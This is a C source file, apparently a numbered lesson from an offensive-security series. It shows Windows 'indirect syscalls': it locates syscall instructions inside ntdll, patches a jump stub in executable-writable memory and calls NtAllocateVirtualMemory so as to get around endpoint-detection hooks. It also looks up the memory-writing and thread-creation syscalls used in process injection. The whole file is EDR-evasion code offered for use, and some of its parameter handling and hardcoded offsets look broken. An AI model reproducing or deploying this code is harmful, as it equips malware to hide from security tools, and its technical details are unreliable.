#include <Windows.h>
#include <stdio.h>

// Indirect syscall - JMP to syscall instruction inside ntdll
// No syscall instruction in our code!

// Find syscall instruction in ntdll
BYTE *FindSyscallInstruction(const char *functionName)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pFunction = GetProcAddress(hNtdll, functionName);

    if (!pFunction)
        return NULL;

    BYTE *code = (BYTE *)pFunction;

    // Scan for syscall (0F 05) instruction
    for (int i = 0; i < 128; i++)
    {
        if (code[i] == 0x0F && code[i + 1] == 0x05)
        {
            printf("[*] Found syscall at offset %d in %s\n", i, functionName);
            printf("    Address: %p\n", code + i);
            return code + i;
        }
    }

    return NULL;
}

// Indirect syscall stub - JMPs to syscall in ntdll
__attribute__((naked))
NTSTATUS
IndirectSyscall(DWORD syscallNumber, ...)
{
    __asm__ volatile(
        "mov r10, rcx\n\t"                     // Save syscall number
        "mov eax, edx\n\t"                     // Syscall number in eax
        "jmp qword ptr [rip+syscall_addr]\n\t" // JMP to ntdll's syscall
        "syscall_addr:\n\t"
        ".quad 0\n\t" // Will be patched
    );
}

// Indirect syscall with parameter forwarding
__attribute__((naked))
NTSTATUS
IndirectSyscallParams(DWORD syscallNumber,
                      HANDLE ProcessHandle,
                      PVOID *BaseAddress,
                      ULONG_PTR ZeroBits,
                      PSIZE_T RegionSize,
                      ULONG AllocationType,
                      ULONG Protect)
{
    __asm__ volatile(
        // Save parameters
        "mov [rsp+0x28], r9\n\t"
        "mov [rsp+0x30], r8\n\t"
        "mov [rsp+0x38], rdx\n\t"
        "mov [rsp+0x40], rcx\n\t"

        // Setup for syscall
        "mov r10, rcx\n\t"       // First param (syscall number)
        "mov eax, edx\n\t"       // Syscall number in eax
        "mov rcx, r8\n\t"        // ProcessHandle
        "mov rdx, r9\n\t"        // BaseAddress
        "mov r8, [rsp+0x28]\n\t" // ZeroBits
        "mov r9, [rsp+0x30]\n\t" // RegionSize

        // JMP to syscall in ntdll
        "jmp qword ptr [rip+syscall_addr]\n\t"
        "syscall_addr:\n\t"
        ".quad 0\n\t");
}

int main()
{
    printf("[ Indirect Syscall - x64 ]\n");
    printf("[*] JMP to syscall instructions in ntdll\n\n");

    // 1. Find syscall instructions in ntdll
    BYTE *syscallNtAlloc = FindSyscallInstruction("NtAllocateVirtualMemory");
    BYTE *syscallNtWrite = FindSyscallInstruction("NtWriteVirtualMemory");
    BYTE *syscallNtProtect = FindSyscallInstruction("NtProtectVirtualMemory");
    BYTE *syscallNtCreate = FindSyscallInstruction("NtCreateThreadEx");

    if (!syscallNtAlloc)
    {
        printf("[-] Could not find syscall instruction\n");
        return -1;
    }

    printf("\n[+] Using syscall at: %p\n", syscallNtAlloc);

    // 2. Create indirect syscall stub
    BYTE *stub = (BYTE *)VirtualAlloc(
        NULL,
        128,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    // Copy indirect syscall stub
    memcpy(stub, (BYTE *)IndirectSyscallParams, 64);

    // Patch the syscall address
    // Find the offset of syscall_addr in the stub
    BYTE *addrPtr = NULL;
    for (int i = 0; i < 64; i++)
    {
        if (stub[i] == 0x00 && stub[i + 1] == 0x00 &&
            stub[i + 2] == 0x00 && stub[i + 3] == 0x00 &&
            stub[i + 4] == 0x00 && stub[i + 5] == 0x00 &&
            stub[i + 6] == 0x00 && stub[i + 7] == 0x00)
        {
            // Look for the pattern around the jmp
            if (i > 0 && stub[i - 1] == 0x25) // jmp qword ptr [rip+offset]
            {
                addrPtr = stub + i;
                break;
            }
        }
    }

    if (addrPtr)
    {
        *(BYTE **)addrPtr = syscallNtAlloc;
        printf("[+] Indirect syscall stub patched\n");
        printf("[+] Stub will JMP to: %p\n", syscallNtAlloc);
    }
    else
    {
        // Manual patch at known offset
        *(BYTE **)(stub + 0x2E) = syscallNtAlloc;
    }

    // 3. Use indirect syscall
    typedef NTSTATUS(NTAPI * pIndirectSyscall)(
        DWORD, HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);

    pIndirectSyscall NtAllocateIndirect = (pIndirectSyscall)stub;

    PVOID baseAddr = NULL;
    SIZE_T size = 0x1000;

    printf("\n[*] Calling indirect syscall...\n");
    printf("[*] No syscall instruction in our code!\n");

    NTSTATUS status = NtAllocateIndirect(
        0x18, // Syscall number (Windows 10 22H2)
        GetCurrentProcess(),
        &baseAddr,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (status == 0)
    {
        printf("[+] SUCCESS: Memory allocated at: %p\n", baseAddr);
        printf("[+] Syscall executed at: %p (in ntdll)\n", syscallNtAlloc);
        printf("[+] Bypassed: EDR hooks on syscall instructions!\n");

        VirtualFree(baseAddr, 0, MEM_RELEASE);
    }

    VirtualFree(stub, 0, MEM_RELEASE);
    return 0;
}

// x86_64-w64-mingw32-gcc -o 06_indirect_syscall.exe 06_indirect_syscall.c